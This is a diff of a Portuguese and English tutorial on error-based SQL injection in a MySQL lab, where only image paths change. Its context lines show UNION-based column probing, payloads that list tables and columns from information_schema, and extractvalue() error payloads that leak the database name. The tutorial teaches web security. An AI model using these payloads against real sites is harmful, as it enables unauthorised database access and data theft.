@@ -33,13 +33,13 @@ Com isso, podemos utilizar o `union` do SQL para unir uma nova consulta, e passa
 ' or 1=1 union select 1; #
 ```
 
-<div data-full-width="false"><figure><img src="../.gitbook/assets/error-based-sqli-1.png" alt=""><figcaption></figcaption></figure></div>
+<div data-full-width="false"><figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-1.png" alt=""><figcaption></figcaption></figure></div>
 
 Assim, conseguimos descobrir a quantidade de colunas que possui, podemos tentar ir aumentando até não retornar nenhum erro.
 
 Nesse caso, podemos descobrir que a quantidade de colunas na tabela de produtos são no total 6. Podemos perceber também que é refletido os valores que inserimos sendo criado uma nova visualização na consulta.
 
-<figure><img src="../.gitbook/assets/error-based-sqli-2.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-2.png" alt=""><figcaption></figcaption></figure>
 
 A consulta final ficará assim, sendo completamente correta e com isso retorna as informações.
 
@@ -47,11 +47,11 @@ A consulta final ficará assim, sendo completamente correta e com isso retorna a
 SELECT * FROM products WHERE name like '%' or 1=1 union select 1, 2, 3, 4, 5, 6; #%'
 ```
 
-<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>
+<figure><img src="assets/web_hacking/sql_injection/error-based-sqli-3.png" alt=""><figcaption></figcaption></figure>
 
 Agora que conseguimos descobrir corretamente a quantidade de colunas e fazer a consulta funcionar como queríamos, podemos tirar vantagem disso para buscar informações do banco de dados, podemos usar funções do MySQL (banco de dados utilizado) como `user()`, `database()`, `version()` entre outras.
 
-<figure><img src="../.gitbook/assets/error-based-sqli-4.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-4.png" alt=""><figcaption></figcaption></figure>
 
 Podemos agora buscar na tabela `information_schema` pela tabela que descobrirmos anteriormente.
 
@@ -59,7 +59,7 @@ Podemos agora buscar na tabela `information_schema` pela tabela que descobrirmos
 ' union select 1, table_name, 3, 4, 5, 6 from information_schema.tables WHERE TABLE_SCHEMA="lab"; #
 ```
 
-<figure><img src="../.gitbook/assets/error-based-sqli-5.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-5.png" alt=""><figcaption></figcaption></figure>
 
 Uma vez que descobrimos o nome das tabelas, podemos ver que existe a tabela `users`. Com isso, nós conseguimos descobrir as colunas:
 
@@ -67,11 +67,11 @@ Uma vez que descobrimos o nome das tabelas, podemos ver que existe a tabela `use
 ' union select 1, column_name, 3, 4, 5, 6 from information_schema.columns where TABLE_SCHEMA="lab" and TABLE_NAME="users"; #
 ```
 
-<figure><img src="../.gitbook/assets/error-based-sqli-6.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-6.png" alt=""><figcaption></figcaption></figure>
 
 Agora que já sabemos quais os nome das colunas, podemos fazer a busca diretamente na tabela de `users`.
 
-<figure><img src="../.gitbook/assets/error-based-sqli-7.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-7.png" alt=""><figcaption></figcaption></figure>
 
 Pronto! Dessa forma que conseguimos explorar o Error-based SQL Injection.
 
@@ -87,7 +87,7 @@ extractvalue("something",concat(0x0a, database())); #
 
 This payload injects the `database()` system variable into the XPath expression, causing MySQL to generate an error that reveals the database name.
 
-<figure><img src="../.gitbook/assets/error-based-sqli-8.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-8.png" alt=""><figcaption></figcaption></figure>
 
 We can also extract the table name from `information_schema`:
 
@@ -95,11 +95,11 @@ We can also extract the table name from `information_schema`:
 ' and extractvalue("something",concat(0x0a, (select table_name from information_schema.tables WHERE TABLE_SCHEMA='lab' limit 0,1))); #
 ```
 
-<figure><img src="../.gitbook/assets/error-based-sqli-9.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-9.png" alt=""><figcaption></figcaption></figure>
 
 We can take a look at the database to see what the query it will look like:
 
-<figure><img src="../.gitbook/assets/error-based-sqli-10.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../assets/web_hacking/sql_injection/error-based-sqli-10.png" alt=""><figcaption></figcaption></figure>
 
 \## SQL Injection Time Based Blind
 
